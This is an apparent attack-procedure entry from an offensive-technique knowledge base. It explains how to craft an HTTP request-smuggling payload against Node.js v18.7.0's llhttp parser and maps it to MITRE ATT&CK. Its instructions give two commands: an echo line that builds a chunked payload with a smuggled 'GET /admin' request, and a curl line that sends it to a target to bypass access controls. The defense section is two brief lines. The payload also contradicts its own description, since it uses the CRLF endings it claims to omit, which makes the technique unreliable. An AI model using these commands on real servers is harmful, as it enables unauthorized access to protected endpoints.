---
tags:
  - http-request-smuggling
  - payload-crafting
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-send-malicious-headers]]'
platforms:
  - Node.js
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: 1235c0f3-15be-4d0c-9b38-54232f42ccd5
created_at: '2025-12-13T09:01:17.720Z'
updated_at: '2025-12-13T09:01:17.720Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft Malicious HTTP Request

## Summary

This procedure details crafting an HTTP request exploiting the llhttp parser's mishandling of non-CRLF terminated headers in Node.js v18.7.0 for request smuggling.

## Description

By constructing requests with chunked encoding and appended smuggled requests without proper CRLF, attackers can exploit the vulnerability to bypass controls. This is targeted at Node.js http modules.

## Requirements

1. Access to a text editor for payload creation
2. curl for testing payloads
3. Understanding of HTTP smuggling techniques

## Defense

Defensive measures and detection strategies:

- Implement strict header parsing validation
- Use WAF to detect malformed requests

## Objectives

1. Create smuggling payload
2. Ensure non-CRLF termination
3. Prepare for execution

## Instructions

### Step 1: Build Chunked Payload

**Context**: Create base chunked request.

**Command** ([[commands/curl-send-malicious-headers]]):

```bash
echo -e "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n" > payload.txt
```

> This saves the smuggled request payload.

### Step 2: Add Malicious Headers

**Context**: Incorporate non-CRLF headers.

**Command** ([[commands/curl-send-malicious-headers]]):

```bash
curl -H "Transfer-Encoding: chunked" -H "Foo: bar" --data @payload.txt http://target.com
```

> Tests the crafted request.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/curl-send-malicious-headers]]

## Tools Used

- [[tools/curl]]

## Tags

- [[http-request-smuggling]]
- [[payload-crafting]]
